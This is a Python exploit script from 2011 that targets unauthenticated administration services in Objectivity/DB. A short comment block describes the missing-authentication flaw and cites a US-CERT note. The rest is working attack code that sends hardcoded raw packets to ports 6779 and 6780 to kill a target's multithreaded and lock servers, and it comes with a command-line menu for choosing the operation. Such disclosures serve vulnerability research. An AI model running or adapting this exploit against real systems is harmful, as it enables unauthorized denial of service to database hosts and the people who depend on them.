#!/usr/bin/python
# obj.py
# Objectivity/DB Lack of Authentication Remote Exploit
# Jeremy Brown [0xjbrown41-gmail-com]
# Jan 2011
#
# "Objectivity, Inc. is a leader in distributed, scalable database technology.
# Our patented data management engine and persistent object store is the enabling
# technology powering some of the most complex applications and mission critical
# systems used in government, business and science organizations today."
#
# Objectivity/DB includes many different tools for administration. The
# problem is, anyone can use these tools to perform operations on the host
# running the lock server, advanced multithreaded server, and probably
# it's other servers as well, without any authentication. This design flaw
# puts the host running these servers at risk of potentially unauthorized
# operations being performed on the system, locally or remotely.
#
# This code demostrates a couple of the easiest operations to replicate
# by hand, like killing the lock and am servers. The suite contains lots
# of other admin tools that do various, more interesting tasks with the
# Objectivity/DB, such as oobackup, oonewfd, oodeletefd, oodebug, etc...
#
# Tested on Objectivity/DB 10 running on Windows
#
# Fixed version: N/A, US-CERT coordinated the communication and released
# a vulnerability note after the vendor did not provide additional feedback.
#
# http://www.kb.cert.org/vuls/id/782567
#

import sys
import socket

kill_ooams=(
"\x0d\x03"+
"\x00"*5+
"\x02"+
"\x00"*3+
"\x19\xf0\x92\xed\x89\xf4\xe8\x95\x43\x03"+
"\x00"*15+
"\x61\x62\x63"+
"\x00"+
"\x31\x32\x33\x34"+
"\x00"*3+
"\x05\x8c"+
"\x00"*3+
"\x0d"+
"\x00"*4
)

kill_ools=(
"\x0d\x03"+
"\x00"*5+
"\x77"+
"\x00"*3+
"\x04\xad\xc4\xae\xda\x9e\x48\xd6\x44\x03"+
"\x00"*15
)

if len(sys.argv)<3:
     print "Objectivity/DB Remote Exploit"
     print "Usage: %s <target> <operation>"%sys.argv[0]
     print "\nWhat would you like to do?\n"
     print "[1] Kill the advanced multithreaded server"
     print "[2] Kill the lock server"
     print "For other operations, check out oobackup, oodebug, etc"
     sys.exit(0)

target=sys.argv[1]
op=int(sys.argv[2])

if((op<1)|(op>2)):
     print "Invalid operation"
     sys.exit(1)

if(op==1):
     port=6779
     data=kill_ooams

if(op==2):
     port=6780
     data=kill_ools

cs=target,port

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(cs)

sock.send(data)

sock.close()